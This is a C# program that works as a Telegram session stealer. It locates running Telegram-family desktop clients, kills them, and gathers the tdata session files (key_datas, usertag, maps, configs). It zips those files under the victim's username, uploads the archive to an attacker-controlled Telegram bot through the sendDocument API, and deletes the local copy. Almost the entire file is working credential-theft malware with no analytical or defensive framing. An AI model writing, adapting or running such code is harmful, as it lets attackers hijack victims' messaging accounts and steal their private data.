using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    private static readonly string BotToken = "token";
    private static readonly string AdminId = "id";

    static async Task CheckAndGrab()
    {
        var stopwatch = Stopwatch.StartNew();
        var tasks = new List<Task>();
        var processes = new[] { "Unigram", "Telegram", "AyuGram", "Kotatogram", "iMe" };

        foreach (var process in processes)
        {
            var path = FindProcessPath(process);
            if (!string.IsNullOrEmpty(path))
            {
                tasks.Add(Grb(process, Path.GetDirectoryName(path)));
            }
        }

        await Task.WhenAll(tasks);
        stopwatch.Stop();
    }

    static async Task Main(string[] args)
    {
        var stopwatch = Stopwatch.StartNew();
        await CheckAndGrab();
        stopwatch.Stop();
    }

    static string FindProcessPath(string processName)
    {
        var processes = Process.GetProcesses();
        foreach (var process in processes)
        {
            try
            {
                if (process.ProcessName.Equals(processName, StringComparison.OrdinalIgnoreCase))
                {
                    return process.MainModule?.FileName;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing process {processName}: {ex.Message}");
            }
        }
        return null;
    }

    static async Task Grb(string proc, string clientPath)
    {
        var processPath = FindProcessPath(proc);
        if (processPath != null)
        {
            var process = Process.GetProcessesByName(proc).FirstOrDefault();
            if (process != null)
            {
                process.Kill();
                process.WaitForExit();
            }
        }

        await Task.Delay(700);
        Directory.SetCurrentDirectory(Path.Combine(clientPath, "tdata"));

        var neededFiles = new List<string>();
        var files = Directory.GetFiles(Directory.GetCurrentDirectory());
        var directories = Directory.GetDirectories(Directory.GetCurrentDirectory());
        var keyDataFile = Path.Combine(Directory.GetCurrentDirectory(), "key_datas");
        if (File.Exists(keyDataFile))
        {
            neededFiles.Add(keyDataFile);
        }

        var settingssFile = Path.Combine(Directory.GetCurrentDirectory(), "settingss");
        if (File.Exists(settingssFile))
        {
            neededFiles.Add(settingssFile);
        }

        var usertagFile = Path.Combine(Directory.GetCurrentDirectory(), "usertag");
        if (File.Exists(usertagFile))
        {
            neededFiles.Add(usertagFile);

            foreach (var directory in directories)
            {
                var folderName = Path.GetFileName(directory);
                var correspondingFile = Path.Combine(Directory.GetCurrentDirectory(), folderName + "s");

                if (File.Exists(correspondingFile))
                {
                    neededFiles.Add(correspondingFile);
                    neededFiles.Add(directory);
                    var mapsFile = Path.Combine(directory, "maps");
                    var configsFile = Path.Combine(directory, "configs");

                    if (File.Exists(mapsFile))
                    {
                        neededFiles.Add(mapsFile);
                    }

                    if (File.Exists(configsFile))
                    {
                        neededFiles.Add(configsFile);
                    }
                }
            }

            string userName = Environment.UserName;
            string archiveName = $"{userName}_{DateTime.Now:HH.mm}.zip";
            await CreateArchive(neededFiles, archiveName);

            using var httpClient = new HttpClient();
            var requestContent = new MultipartFormDataContent
            {
                { new StringContent(AdminId), "chat_id" },
                { new StringContent("HTML"), "parse_mode" },
                { new StringContent($"👤 User: {userName}"), "caption" },
            };

            using (var fileStream = new FileStream(archiveName, FileMode.Open, FileAccess.Read))
            {
                requestContent.Add(new StreamContent(fileStream), "document", archiveName);
                await httpClient.PostAsync($"https://api.telegram.org/bot{BotToken}/sendDocument", requestContent);
            }

            if (File.Exists(archiveName))
            {
                File.Delete(archiveName);
            }
        }
    }

    static async Task CreateArchive(List<string> filePaths, string archiveName)
    {
        string archivePath = Path.Combine(Directory.GetCurrentDirectory(), archiveName);

        using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
        {
            foreach (var filePath in filePaths)
            {
                if (File.Exists(filePath))
                {
                    archive.CreateEntryFromFile(filePath, Path.GetRelativePath(Directory.GetCurrentDirectory(), filePath));
                }
                else if (Directory.Exists(filePath))
                {
                    archive.CreateEntry(Path.GetRelativePath(Directory.GetCurrentDirectory(), filePath) + "/");
                }
            }
        }
    }
}